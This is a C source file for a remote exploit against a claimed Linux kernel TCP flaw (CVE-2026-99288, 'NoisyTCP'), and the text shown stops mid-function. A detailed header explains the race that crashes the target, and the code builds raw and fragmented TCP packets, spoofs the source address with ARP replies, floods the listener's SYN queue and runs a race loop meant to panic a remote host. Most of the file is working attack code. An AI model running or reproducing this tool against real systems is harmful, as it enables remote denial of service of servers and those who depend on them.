/*
 * noisytcp.c - C implementation of the NoisyTCP (CVE-2026-99288) trigger.
 *
 * This is an independent re-implementation of the PoC described in
 * V4bel/NoisyTCP ("NoisyTCP: Linux Kernel TCP Pre-auth Remote Corruption").
 * That repository ships the advisory only; no exploit source was published.
 * Everything below is built from the advisory text, the upstream fix commit
 * 4e2b3ef19e0e ("inet: reject unhashed sockets during established lookups")
 * and the corresponding Linux TCP receive path.
 *
 * ---------------------------------------------------------------------------
 * The bug
 * ---------------------------------------------------------------------------
 * __inet_lookup_established() is lockless.  It walks the ehash chain, matches
 * the 4-tuple, takes a reference with refcount_inc_not_zero(), and only then
 * re-checks the tuple -- it never checks whether the object it just pinned is
 * still hashed.  TCP request sockets live in a SLAB_TYPESAFE_BY_RCU cache, so
 * the address of a freed request socket can be handed to the very next
 * allocation while an RCU reader still holds that address.
 *
 * If that next allocation is a SYN-cookie request created by
 * tcp_get_cookie_sock() for the same 4-tuple, the reader:
 *
 *   - sees sk->sk_hash match        (the freed slot still holds the old hash)
 *   - sees inet_match() succeed     (the cookie request rebuilds the tuple)
 *   - sees refcount_inc_not_zero()  (the cookie request has refcount 1)
 *
 * ...and returns an object that was never inserted into ehash and whose
 * rsk_listener is NULL (inet_reqsk_alloc(ops, sk, attach_listener = false)).
 * tcp_v4_rcv() then does:
 *
 *     if (sk->sk_state == TCP_NEW_SYN_RECV) {
 *             req = inet_reqsk(sk);
 *             sk  = req->rsk_listener;          // NULL
 *             ...
 *             if (unlikely(sk->sk_state != TCP_LISTEN))   // NULL + 0x12
 *
 * and the receive softirq panics.  skc_state is at offset 0x12 in
 * struct sock_common, exactly the fault address in the advisory.
 *
 * ---------------------------------------------------------------------------
 * What the trigger needs
 * ---------------------------------------------------------------------------
 *  1. A hashed request socket R for tuple T.  A SYN sent while the listener's
 *     SYN queue has room makes tcp_conn_request() create one and
 *     reqsk_queue_hash_req() install it in ehash.
 *
 *  2. A valid SYN cookie C for the *same* tuple T.  A SYN sent while the SYN
 *     queue is full takes the syncookie path (net.ipv4.tcp_syncookies=1); the
 *     server answers with a SYN-ACK whose sequence number is the cookie.  The
 *     cookie is a stateless function of the tuple and stays usable for
 *     MAX_SYNCOOKIE_AGE * 60 s = 120 s, provided the listener saw a SYN-queue
 *     overflow within that window (tcp_synq_no_recent_overflow()).
 *
 *  3. Free R and reallocate its slab slot with the cookie request.  An RST
 *     with seq = rcv_nxt is in-window, so tcp_check_req() takes the
 *     "embryonic reset" path and calls inet_csk_reqsk_queue_drop() ->
 *     reqsk_put() -> __reqsk_free() -> kmem_cache_free().  The following ACK
 *     that carries C makes cookie_v4_check() allocate a request socket
 *     (inet_reqsk_alloc(..., attach_listener = false)) and publish it with
 *     refcount 1 in tcp_get_cookie_sock().  Both packets are processed by the
 *     same RX context, so the per-CPU SLUB freelist hands back the same slot.
 *
 *  4. A concurrent lookup of T in a *different* RX context, which loaded R's
 *     address and is standing between its first inet_match() and its
 *     refcount_inc_not_zero().  The lookup packet is sent as two IPv4
 *     fragments: __skb_flow_dissect() stops at L3 for fragments
 *     (FLOW_DIS_IS_FRAGMENT), so fragments hash on {src,dst} only, while plain
 *     packets hash on the full 4-tuple.  With two or more RX queues or with
 *     RPS enabled, the two groups land on different CPUs.
 *
 * Step 4 is the hard part and the reason the advisory quotes 5 s..2 min on
 * KVM/QEMU (vCPU preemption widens the window) and ~14 h on a quiet bare-metal
 * box.  The window between inet_match() and the refcount RMW is a couple of
 * nanoseconds; something has to interrupt the reader inside it.  This tool
 * maximises the attempt rate and exposes the timing knobs, but it cannot make
 * the target kernel preemptible.  See README.md.
 *
 * ---------------------------------------------------------------------------
 * Using it
 * ---------------------------------------------------------------------------
 *   # probe        one SYN, one SYN-ACK, checks for host RST leakage
 *   # verify       runs every precondition once and reports what the target did
 *   # race         the actual race loop
 *   # tw           alternative setup for targets with tcp_syncookies=2
 *
 * The target must be a TCP listener that the host running this tool can reach
 * with raw IP packets (root/CAP_NET_RAW required).  Use it only against
 * systems you own or are authorised to test.
 *
 * Build: cc -O2 -pthread -o noisytcp noisytcp.c
 */

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netpacket/packet.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stdatomic.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

/* ------------------------------------------------------------------------- */
/* constants                                                                 */
/* ------------------------------------------------------------------------- */

#ifndef ETHERTYPE_IP
#define ETHERTYPE_IP 0x0800
#endif
#ifndef ETHERTYPE_ARP
#define ETHERTYPE_ARP 0x0806
#endif

#define ETH_P_ALL_VAL 0x0003

#define IPPROTO_TCP_VAL 6
#define IP_MF_VAL 0x2000
#define IP_OFFSET_MASK 0x1fff
#define IPV4_HDR_LEN 20
#define TCP_HDR_LEN 20

/* TCP flags */
#define F_FIN 0x01
#define F_SYN 0x02
#define F_RST 0x04
#define F_PSH 0x08
#define F_ACK 0x10
#define F_URG 0x20

/* IPv4 header field offsets */
#define IP_OFF_VER_IHL 0
#define IP_OFF_TOS 1
#define IP_OFF_TOTLEN 2
#define IP_OFF_ID 4
#define IP_OFF_FRAG 6
#define IP_OFF_TTL 8
#define IP_OFF_PROTO 9
#define IP_OFF_CSUM 10
#define IP_OFF_SADDR 12
#define IP_OFF_DADDR 16

/* TCP header field offsets */
#define TCP_OFF_SPORT 0
#define TCP_OFF_DPORT 2
#define TCP_OFF_SEQ 4
#define TCP_OFF_ACK 8
#define TCP_OFF_DOFF 12
#define TCP_OFF_FLAGS 13
#define TCP_OFF_WINDOW 14
#define TCP_OFF_CSUM 16
#define TCP_OFF_URG 18

#define ARP_OFF_OP 6
#define ARP_OFF_SHA 8
#define ARP_OFF_SPA 14
#define ARP_OFF_THA 18
#define ARP_OFF_TPA 24
#define ARP_FRAME_LEN 42

#define MAX_BATCH 64
#define JUNK_MAX 16384
#define SPORT_TABLE 65536
#define PKT_MAX 1600

enum frag_mode {
	FRAG_NONE = 0,
	FRAG_FIRST = 1,
	FRAG_LAST = 2,
};

enum run_mode {
	MODE_PROBE,
	MODE_VERIFY,
	MODE_RACE,
	MODE_TW,
};

/* ------------------------------------------------------------------------- */
/* configuration                                                             */
/* ------------------------------------------------------------------------- */

struct cfg {
	struct in_addr dst;
	struct in_addr src;
	uint16_t dport;
	char ifname[IF_NAMESIZE];
	int ifindex;
	uint8_t ifmac[6];
	bool have_ifmac;
	bool spoof;
	bool assume_ok;      /* do not abort on host RST leakage */
	bool no_calibrate;   /* trust --backlog instead of probing it */
	bool keep_children;  /* do not send the per-shot cleanup RST */
	bool quiet;
	bool debug;

	int mode;
	int backlog;         /* 0 = calibrate */
	int batch;
	int duration;
	int fill;            /* junk SYNs per round (derived) */
	int readers;         /* reader packets per shot */
	int payload;         /* reader TCP payload bytes */
	int frag_split;      /* bytes of the segment carried by fragment #1 */
	int frag_gap_us;
	int free_gap_us;
	int alloc_gap_us;
	int jitter_us;
	int settle_us;
	int synack_ms;
	int sport_low;
	int sport_high;
	uint32_t mark;
};

static struct cfg g = {
	.dport = 0,
	.mode = MODE_RACE,
	.backlog = 0,
	.batch = 8,
	.duration = 60,
	.fill = 128,
	.readers = 1,
	.payload = 16,
	.frag_split = 24,
	.frag_gap_us = 20,
	.free_gap_us = 0,
	.alloc_gap_us = 4,
	.jitter_us = 4,
	.settle_us = 300,
	.synack_ms = 10,
	.sport_low = 32768,
	.sport_high = 60999,
	.mark = 1,
};

/* ------------------------------------------------------------------------- */
/* small utilities                                                           */
/* ------------------------------------------------------------------------- */

static volatile sig_atomic_t g_stop;

static uint64_t now_ns(void)
{
	struct timespec ts;

	clock_gettime(CLOCK_MONOTONIC, &ts);
	return (uint64_t)ts.tv_sec * 1000000000ull + (uint64_t)ts.tv_nsec;
}

static void spin_us(int us)
{
	uint64_t end;

	if (us <= 0)
		return;
	end = now_ns() + (uint64_t)us * 1000ull;
	while (now_ns() < end)
		;
}

static void sleep_us(int us)
{
	struct timespec ts;

	if (us <= 0)
		return;
	ts.tv_sec = us / 1000000;
	ts.tv_nsec = (long)(us % 1000000) * 1000L;
	nanosleep(&ts, NULL);
}

static uint32_t rnd32(void)
{
	static uint64_t state = 0;
	uint64_t x;

	if (state == 0)
		state = 0x9e3779b97f4a7c15ull ^ ((uint64_t)getpid() << 32) ^ now_ns();
	/* xorshift64* */
	x = state;
	x ^= x >> 12;
	x ^= x << 25;
	x ^= x >> 27;
	state = x;
	return (uint32_t)((x * 0x2545f4914f6cdd1dull) >> 32);
}

static int rnd_range(int n)
{
	if (n <= 0)
		return 0;
	return (int)(rnd32() % (uint32_t)n);
}

static void be16(uint8_t *p, uint16_t v)
{
	p[0] = (uint8_t)(v >> 8);
	p[1] = (uint8_t)v;
}

static void be32(uint8_t *p, uint32_t v)
{
	p[0] = (uint8_t)(v >> 24);
	p[1] = (uint8_t)(v >> 16);
	p[2] = (uint8_t)(v >> 8);
	p[3] = (uint8_t)v;
}

static uint16_t rd16(const uint8_t *p)
{
	return (uint16_t)(((uint16_t)p[0] << 8) | p[1]);
}

static uint32_t rd32(const uint8_t *p)
{
	return ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16) |
	       ((uint32_t)p[2] << 8) | (uint32_t)p[3];
}

/* ------------------------------------------------------------------------- */
/* internet checksum                                                         */
/* ------------------------------------------------------------------------- */

static uint32_t csum_add(const void *data, size_t len, uint32_t sum)
{
	const uint8_t *p = (const uint8_t *)data;

	while (len > 1) {
		sum += ((uint32_t)p[0] << 8) | (uint32_t)p[1];
		p += 2;
		len -= 2;
	}
	if (len)
		sum += (uint32_t)p[0] << 8;
	return sum;
}

static uint16_t csum_fold(uint32_t sum)
{
	while (sum >> 16)
		sum = (sum & 0xffff) + (sum >> 16);
	return (uint16_t)(~sum & 0xffff);
}

static uint16_t tcp_csum(const uint8_t *seg, int seglen)
{
	uint8_t pseudo[12];
	uint32_t sum = 0;

	memcpy(pseudo, &g.src.s_addr, 4);
	memcpy(pseudo + 4, &g.dst.s_addr, 4);
	pseudo[8] = 0;
	pseudo[9] = IPPROTO_TCP_VAL;
	be16(pseudo + 10, (uint16_t)seglen);

	sum = csum_add(pseudo, sizeof(pseudo), sum);
	sum = csum_add(seg, (size_t)seglen, sum);
	return csum_fold(sum);
}

/* ------------------------------------------------------------------------- */
/* logging and counters                                                      */
/* ------------------------------------------------------------------------- */

static unsigned long g_attempts, g_rounds, g_cookies, g_synacks;
static unsigned long g_send_calls, g_send_errs, g_rst_leaks;
static unsigned long g_rx_frames, g_rx_ip, g_rx_tcp;

/* inet_ntoa() reuses one buffer, so two calls in a single printf collide */
static const char *ipstr(struct in_addr a)
{
	static char bufs[4][INET_ADDRSTRLEN];
	static unsigned idx;

	char *b = bufs[idx++ & 3u];

	inet_ntop(AF_INET, &a, b, sizeof(bufs[0]));
	return b;
}

static void info(const char *fmt, ...)
{
	va_list ap;

	if (g.quiet)
		return;
	va_start(ap, fmt);
	vfprintf(stdout, fmt, ap);
	va_end(ap);
	fflush(stdout);
}

static void die(const char *fmt, ...)
{
	va_list ap;

	va_start(ap, fmt);
	fprintf(stderr, "error: ");
	vfprintf(stderr, fmt, ap);
	fprintf(stderr, "\n");
	va_end(ap);
	exit(1);
}

/* ------------------------------------------------------------------------- */
/* address, route and interface discovery                                    */
/* ------------------------------------------------------------------------- */

#ifndef SIOCGIFINDEX
#define SIOCGIFINDEX 0x8933
#endif
#ifndef SIOCGIFHWADDR
#define SIOCGIFHWADDR 0x8927
#endif
#ifndef SIOCGIFADDR
#define SIOCGIFADDR 0x8915
#endif

static bool is_local_addr(struct in_addr a)
{
	struct sockaddr_in sa;
	int fd;
	bool ok;

	fd = socket(AF_INET, SOCK_STREAM, 0);
	if (fd < 0)
		return false;
	memset(&sa, 0, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_addr = a;
	sa.sin_port = 0;
	ok = bind(fd, (struct sockaddr *)&sa, sizeof(sa)) == 0;
	close(fd);
	return ok;
}

static uint32_t src_for_dst(struct in_addr dst)
{
	struct sockaddr_in sa;
	socklen_t sl = sizeof(sa);
	int fd;
	uint32_t ret = 0;

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0)
		return 0;
	memset(&sa, 0, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_addr = dst;
	sa.sin_port = htons(9);
	if (connect(fd, (struct sockaddr *)&sa, sizeof(sa)) == 0) {
		memset(&sa, 0, sizeof(sa));
		sl = sizeof(sa);
		if (getsockname(fd, (struct sockaddr *)&sa, &sl) == 0)
			ret = sa.sin_addr.s_addr;
	}
	close(fd);
	return ret;
}

/*
 * Longest-prefix match from /proc/net/route.  Values in that file are printed
 * as network-order hex, i.e. directly comparable with in_addr.s_addr.
 */
static int route_lookup(struct in_addr dst, struct in_addr *gw, char *ifname,
			size_t iflen)
{
	FILE *f;
	char line[256];
	uint32_t best_mask = 0;
	uint32_t best_dest = 0;
	int found = 0;

	f = fopen("/proc/net/route", "r");
	if (!f)
		return -1;
	while (fgets(line, sizeof(line), f)) {
		char name[64];
		unsigned long dest, gateway, flags, mask;
		unsigned long refcnt, use, metric;

		if (sscanf(line, "%63s %lx %lx %lx %lu %lu %lu %lx", name,
			   &dest, &gateway, &flags, &refcnt, &use, &metric,
			   &mask) != 8)
			continue;
		if (((uint32_t)mask & dst.s_addr) != ((uint32_t)mask & (uint32_t)dest))
			continue;
		if (!found || (uint32_t)mask > best_mask) {
			best_mask = (uint32_t)mask;
			best_dest = (uint32_t)dest;
			gw->s_addr = (uint32_t)gateway;
			snprintf(ifname, iflen, "%s", name);
			found = 1;
		}
	}
	fclose(f);
	(void)best_dest;
	return found ? 0 : -1;
}

static int iface_info(const char *name)
{
	struct ifreq ifr;
	int fd;

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0)
		return -1;

	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", name);
	if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0) {
		close(fd);
		return -1;
	}
	g.ifindex = ifr.ifr_ifindex;

	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", name);
	if (ioctl(fd, SIOCGIFHWADDR, &ifr) == 0) {
		memcpy(g.ifmac, ifr.ifr_hwaddr.sa_data, 6);
		g.have_ifmac = true;
	}
	close(fd);
	return 0;
}

/* ------------------------------------------------------------------------- */
/* raw transmit path                                                         */
/* ------------------------------------------------------------------------- */

static int g_tx = -1;
static uint16_t g_ipid = 0x4e00;

static int tx_open(void)
{
	int one = 1;
	uint32_t mark = g.mark;

	g_tx = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if (g_tx < 0)
		return -1;
	if (setsockopt(g_tx, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
		close(g_tx);
		g_tx = -1;
		return -1;
	}
	if (mark) {
		if (setsockopt(g_tx, SOL_SOCKET, SO_MARK, &mark, sizeof(mark)) < 0) {
			/* not fatal: only needed to exempt our packets from an
			 * RST-drop rule the operator may have installed */
		}
	}
	return 0;
}

static void ip_send(const uint8_t *payload, int len, uint16_t id, int off_bytes,
		    int mf)
{
	uint8_t pkt[PKT_MAX];
	struct sockaddr_in dst;
	uint16_t frag;
	int tot;

	tot = IPV4_HDR_LEN + len;
	if (tot > (int)sizeof(pkt) || len <= 0)
		return;

	memset(pkt, 0, IPV4_HDR_LEN);
	pkt[IP_OFF_VER_IHL] = 0x45;
	pkt[IP_OFF_TOS] = 0;
	be16(pkt + IP_OFF_TOTLEN, (uint16_t)tot);
	be16(pkt + IP_OFF_ID, id);
	frag = (uint16_t)((off_bytes / 8) & IP_OFFSET_MASK);
	if (mf)
		frag = (uint16_t)(frag | IP_MF_VAL);
	be16(pkt + IP_OFF_FRAG, frag);
	pkt[IP_OFF_TTL] = 64;
	pkt[IP_OFF_PROTO] = IPPROTO_TCP_VAL;
	memcpy(pkt + IP_OFF_SADDR, &g.src.s_addr, 4);
	memcpy(pkt + IP_OFF_DADDR, &g.dst.s_addr, 4);
	be16(pkt + IP_OFF_CSUM, csum_fold(csum_add(pkt, IPV4_HDR_LEN, 0)));
	memcpy(pkt + IPV4_HDR_LEN, payload, (size_t)len);

	memset(&dst, 0, sizeof(dst));
	dst.sin_family = AF_INET;
	dst.sin_addr = g.dst;

	g_send_calls++;
	if (sendto(g_tx, pkt, (size_t)tot, 0, (struct sockaddr *)&dst,
		   sizeof(dst)) < 0) {
		g_send_errs++;
		if (g.debug && g_send_errs < 8)
			info("[dbg] sendto: %s\n", strerror(errno));
	}
}

/*
 * Build one TCP segment and emit it, either as a single datagram or as one
 * half of an IPv4 fragment pair.  Both halves of a pair must carry the same
 * IP identification value.
 */
static void tcp_send_frag(uint16_t sport, uint32_t seq, uint32_t ack,
			  uint8_t flags, const uint8_t *payload, int paylen,
			  uint16_t id, int frag)
{
	uint8_t seg[512];
	int seglen = TCP_HDR_LEN + paylen;

	if (seglen > (int)sizeof(seg) || seglen <= 0)
		return;
	memset(seg, 0, sizeof(seg));
	be16(seg + TCP_OFF_SPORT, sport);
	be16(seg + TCP_OFF_DPORT, g.dport);
	be32(seg + TCP_OFF_SEQ, seq);
	be32(seg + TCP_OFF_ACK, ack);
	be16(seg + TCP_OFF_DOFF, (uint16_t)((5u << 12) | flags));
	be16(seg + TCP_OFF_WINDOW, 65535);
	if (paylen > 0 && payload)
		memcpy(seg + TCP_HDR_LEN, payload, (size_t)paylen);
	be16(seg + TCP_OFF_CSUM, tcp_csum(seg, seglen));

	switch (frag) {
	case FRAG_FIRST:
		ip_send(seg, g.frag_split, id, 0, 1);
		break;
	case FRAG_LAST:
		ip_send(seg + g.frag_split, seglen - g.frag_split, id,
			g.frag_split, 0);
		break;
	default:
		ip_send(seg, seglen, id, 0, 0);
		break;
	}
}

static void tcp_send(uint16_t sport, uint32_t seq, uint32_t ack, uint8_t flags,
		     const uint8_t *payload, int paylen)
{
	tcp_send_frag(sport, seq, ack, flags, payload, paylen, g_ipid++, FRAG_NONE);
}

/* ------------------------------------------------------------------------- */
/* receive path: AF_PACKET sniffer                                           */
/* ------------------------------------------------------------------------- */

/*
 * in_addr.s_addr holds the address in network byte order: the raw wire bytes
 * reinterpreted as a host integer.  Reading four header bytes with rd32()
 * yields the *swapped* value on little-endian hosts, so address comparisons
 * have to work on the raw bytes.
 */
static uint32_t addr_get(const uint8_t *p)
{
	uint32_t v;

	memcpy(&v, p, 4);
	return v;
}

static int g_rx = -1;

static _Atomic uint32_t g_syn_isn[SPORT_TABLE];
static _Atomic uint32_t g_syn_ack[SPORT_TABLE];
static _Atomic uint32_t g_syn_flags[SPORT_TABLE];
static _Atomic uint32_t g_seg_count[SPORT_TABLE];

/* RST leak detector: set while probing, 0 when not watching. */
static _Atomic uint32_t g_rst_watch;
static _Atomic uint32_t g_rst_seen;

static void arp_reply(const uint8_t *req, const struct sockaddr_ll *ll)
{
	uint8_t f[ARP_FRAME_LEN];
	struct sockaddr_ll out;

	if (!g.have_ifmac)
		return;
	/* Ethernet */
	memcpy(f, req + ARP_OFF_SHA, 6);
	memcpy(f + 6, g.ifmac, 6);
	be16(f + 12, ETHERTYPE_ARP);
	/* ARP reply */
	be16(f + 14, 1);              /* htype: ethernet */
	be16(f + 16, ETHERTYPE_IP);   /* ptype */
	f[18] = 6;
	f[19] = 4;
	be16(f + 20, 2);              /* op: reply */
	memcpy(f + 22, g.ifmac, 6);   /* sha */
	memcpy(f + 28, &g.src.s_addr, 4); /* spa */
	memcpy(f + 32, req + ARP_OFF_SHA, 6); /* tha */
	memcpy(f + 38, req + ARP_OFF_SPA, 4); /* tpa */

	memset(&out, 0, sizeof(out));
	out.sll_family = AF_PACKET;
	out.sll_protocol = htons(ETHERTYPE_ARP);
	out.sll_ifindex = g.ifindex;
	out.sll_halen = 6;
	memcpy(out.sll_addr, req + ARP_OFF_SHA, 6);
	sendto(g_rx, f, sizeof(f), 0, (struct sockaddr *)&out, sizeof(out));
	(void)ll;
}

static void arp_announce(void)
{
	uint8_t f[ARP_FRAME_LEN];
	struct sockaddr_ll out;

	if (!g.spoof || !g.have_ifmac || g_rx < 0)
		return;
	memset(f, 0xff, 6);
	memcpy(f + 6, g.ifmac, 6);
	be16(f + 12, ETHERTYPE_ARP);
	be16(f + 14, 1);
	be16(f + 16, ETHERTYPE_IP);
	f[18] = 6;
	f[19] = 4;
	be16(f + 20, 2);
	memcpy(f + 22, g.ifmac, 6);
	memcpy(f + 28, &g.src.s_addr, 4);
	memset(f + 32, 0, 6);
	memcpy(f + 38, &g.src.s_addr, 4);

	memset(&out, 0, sizeof(out));
	out.sll_family = AF_PACKET;
	out.sll_protocol = htons(ETHERTYPE_ARP);
	out.sll_ifindex = g.ifindex;
	out.sll_halen = 6;
	sendto(g_rx, f, sizeof(f), 0, (struct sockaddr *)&out, sizeof(out));
}

static void handle_frame(const uint8_t *f, size_t len,
			 const struct sockaddr_ll *ll)
{
	const uint8_t *ip;
	uint16_t eth;
	int ihl;

	g_rx_frames++;
	if (len < 14)
		return;
	eth = rd16(f + 12);
	if (g.debug && g_rx_frames < 8)
		info("[dbg] frame len=%zu eth=0x%04x pkttype=%d\n", len, eth,
		     ll->sll_pkttype);

	if (eth == ETHERTYPE_ARP) {
		const uint8_t *arp = f + 14;

		if (len < 14 + 28 || !g.spoof || !g.have_ifmac)
			return;
		if (rd16(arp + ARP_OFF_OP) != 1)
			return;
		if (addr_get(arp + ARP_OFF_TPA) != g.src.s_addr)
			return;
		arp_reply(arp, ll);
		return;
	}

	if (eth != ETHERTYPE_IP)
		return;
	g_rx_ip++;
	if (len < 14 + 20)
		return;

	ip = f + 14;
	if ((ip[0] >> 4) != 4)
		return;
	ihl = (ip[0] & 0x0f) * 4;
	if (ihl < 20 || len < 14 + (size_t)ihl + 20)
		return;
	if (ip[IP_OFF_PROTO] != IPPROTO_TCP_VAL)
		return;
	g_rx_tcp++;
	if ((rd16(ip + IP_OFF_FRAG) & (IP_MF_VAL | IP_OFFSET_MASK)) != 0)
		return;

	{
		const uint8_t *th = ip + ihl;
		uint32_t saddr = addr_get(ip + IP_OFF_SADDR);
		uint32_t daddr = addr_get(ip + IP_OFF_DADDR);
		uint16_t sport = rd16(th + TCP_OFF_SPORT);
		uint16_t dport = rd16(th + TCP_OFF_DPORT);
		uint8_t flags = th[TCP_OFF_FLAGS];

		if (g.debug && g_rx_tcp < 24)
			info("[dbg] tcp %u->%u flags=0x%02x seq=0x%08x ack=0x%08x out=%d\n",
			     (unsigned)sport, (unsigned)dport, flags,
			     rd32(th + TCP_OFF_SEQ), rd32(th + TCP_OFF_ACK),
			     ll->sll_pkttype == PACKET_OUTGOING);

		if (ll->sll_pkttype == PACKET_OUTGOING) {
			uint32_t watch = atomic_load_explicit(&g_rst_watch,
							     memory_order_relaxed);

			if (watch && saddr == g.src.s_addr &&
			    daddr == g.dst.s_addr && sport == (uint16_t)watch &&
			    (flags & F_RST) && !(flags & F_ACK)) {
				atomic_store_explicit(&g_rst_seen, 1,
						      memory_order_relaxed);
			}
			return;
		}

		if (daddr != g.src.s_addr)
			return;
		if (sport != g.dport)
			return;

		/* Record every segment the target sends to this source port:
		 * SYN-ACKs, challenge ACKs, FINs and the ACK that confirms a
		 * TIME_WAIT transition all matter to the callers. */
		if ((flags & (F_SYN | F_ACK)) == (F_SYN | F_ACK))
			g_synacks++;
		atomic_store_explicit(&g_syn_isn[dport], rd32(th + TCP_OFF_SEQ),
				      memory_order_relaxed);
		atomic_store_explicit(&g_syn_ack[dport], rd32(th + TCP_OFF_ACK),
				      memory_order_relaxed);
		atomic_store_explicit(&g_syn_flags[dport], flags,
				      memory_order_relaxed);
		atomic_fetch_add_explicit(&g_seg_count[dport], 1,
					  memory_order_release);
	}
}

static void *sniffer_main(void *arg)
{
	uint8_t buf[PKT_MAX];
	uint64_t last_arp = 0;

	(void)arg;
	while (!g_stop) {
		struct sockaddr_ll ll;
		socklen_t ll_len = sizeof(ll);
		ssize_t n;

		n = recvfrom(g_rx, buf, sizeof(buf), 0, (struct sockaddr *)&ll,
			     &ll_len);
		if (n < 14) {
			if (g.spoof && now_ns() - last_arp > 2000000000ull) {
				arp_announce();
				last_arp = now_ns();
			}
			continue;
		}
		handle_frame(buf, (size_t)n, &ll);
	}
	return NULL;
}

static int rx_open(void)
{
	struct timeval tv;
	int rcvbuf = 32 * 1024 * 1024;
	struct sockaddr_ll sll;

	g_rx = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL_VAL));
	if (g_rx < 0)
		return -1;
	setsockopt(g_rx, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf));

	memset(&tv, 0, sizeof(tv));
	tv.tv_sec = 0;
	tv.tv_usec = 200000;
	setsockopt(g_rx, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

	if (g.ifindex > 0) {
		memset(&sll, 0, sizeof(sll));
		sll.sll_family = AF_PACKET;
		sll.sll_protocol = htons(ETH_P_ALL_VAL);
		sll.sll_ifindex = g.ifindex;
		if (bind(g_rx, (struct sockaddr *)&sll, sizeof(sll)) < 0) {
			close(g_rx);
			g_rx = -1;
			return -1;
		}
	}
	return 0;
}

/* ------------------------------------------------------------------------- */
/* SYN-ACK / challenge-ACK helpers                                           */
/* ------------------------------------------------------------------------- */

/*
 * Every captured segment increments a per-port counter after its fields have
 * been stored.  Callers snapshot the counter *before* sending a packet and
 * then wait for it to change, so a reply that belongs to an earlier SYN can
 * never be mistaken for the answer to the current one.
 */
static uint32_t seg_mark(uint16_t sport)
{
	return atomic_load_explicit(&g_seg_count[sport], memory_order_acquire);
}

static uint32_t seg_next(uint16_t sport, uint32_t *mark, int timeout_ms,
			 uint32_t *isn, uint32_t *ack)
{
	uint64_t deadline = now_ns() + (uint64_t)timeout_ms * 1000000ull;

	for (;;) {
		uint32_t c = atomic_load_explicit(&g_seg_count[sport],
						  memory_order_acquire);

		if (c != *mark) {
			uint32_t flags;

			*mark = c;
			flags = atomic_load_explicit(&g_syn_flags[sport],
						     memory_order_relaxed);
			if (isn)
				*isn = atomic_load_explicit(&g_syn_isn[sport],
							    memory_order_relaxed);
			if (ack)
				*ack = atomic_load_explicit(&g_syn_ack[sport],
							    memory_order_relaxed);
			return flags;
		}
		if (now_ns() >= deadline)
			return 0;
		sleep_us(50);
	}
}

static bool wait_synack(uint16_t sport, uint32_t *mark, uint32_t syn_seq,
			uint32_t *isn, int timeout_ms)
{
	uint64_t deadline = now_ns() + (uint64_t)timeout_ms * 1000000ull;

	for (;;) {
		uint32_t seq = 0, ack = 0;
		uint32_t flags;

		flags = seg_next(sport, mark, 1, &seq, &ack);
		if (flags) {
			if ((flags & (F_SYN | F_ACK)) == (F_SYN | F_ACK) &&
			    ack == syn_seq + 1) {
				if (isn)
					*isn = seq;
				return true;
			}
		}
		if (now_ns() >= deadline)
			return false;
		sleep_us(50);
	}
}

/*
 * Convenience wrapper: take a mark, send, then wait.  Callers that send more
 * than one packet per wait use seg_mark()/seg_next() directly.
 */
struct synwatch {
	uint16_t sport;
	uint32_t mark;
};

static struct synwatch syn_watch(uint16_t sport)
{
	struct synwatch w;

	w.sport = sport;
	w.mark = seg_mark(sport);
	return w;
}

static uint32_t syn_wait(struct synwatch *w, int timeout_ms, uint32_t *isn,
			 uint32_t *ack)
{
	return seg_next(w->sport, &w->mark, timeout_ms, isn, ack);
}

static bool syn_wait_ack(struct synwatch *w, uint32_t syn_seq, uint32_t *isn,
			 int timeout_ms)
{
	return wait_synack(w->sport, &w->mark, syn_seq, isn, timeout_ms);
}

static uint32_t seg_count(uint16_t sport)
{
	return atomic_load_explicit(&g_seg_count[sport], memory_order_acquire);
}

static void seg_read(uint16_t sport, uint32_t *flags, uint32_t *isn,
		     uint32_t *ack)
{
	if (flags)
		*flags = atomic_load_explicit(&g_syn_flags[sport],
					      memory_order_relaxed);
	if (isn)
		*isn = atomic_load_explicit(&g_syn_isn[sport],
					    memory_order_relaxed);
	if (ack)
		*ack = atomic_load_explicit(&g_syn_ack[sport],
					    memory_order_relaxed);
}

/* ------------------------------------------------------------------------- */
/* source-port allocation and SYN-queue junk                                 */
/* ------------------------------------------------------------------------- */

static uint16_t g_next_sport;

static uint16_t take_sport(void)
{
	uint16_t p = g_next_sport;

	if (p < (uint16_t)g.sport_low || p > (uint16_t)g.sport_high)
		p = (uint16_t)g.sport_low;
	g_next_sport = (uint16_t)(p + 1);
	return p;
}

struct junk_req {
	uint16_t sport;
	uint32_t seq;
};

/*
 * FIFO of request sockets we asked the listener to create.  Draining takes the
 * oldest entry: with fill == backlog every tracked request is queued, and the
 * oldest ones are the ones that still hold a slot after the refills below.
 */
static struct junk_req g_junk[JUNK_MAX];
static unsigned int g_junk_head;
static unsigned int g_junk_tail;

static unsigned int junk_count(void)
{
	return g_junk_tail - g_junk_head;
}

/*
 * Ask the listener to create half-open request sockets.  Each SYN consumes one
 * slot of the SYN queue (inet_csk_reqsk_queue_is_full() compares its qlen with
 * sk_max_ack_backlog).  The sequence number is remembered so the matching
 * in-window RST (seq + 1 == rcv_nxt) can drop the request again.
 */
static void junk_fill(int n)
{
	int i;

	for (i = 0; i < n; i++) {
		uint16_t sport;
		uint32_t seq;

		if (junk_count() >= JUNK_MAX)
			g_junk_head++;
		sport = take_sport();
		seq = rnd32();
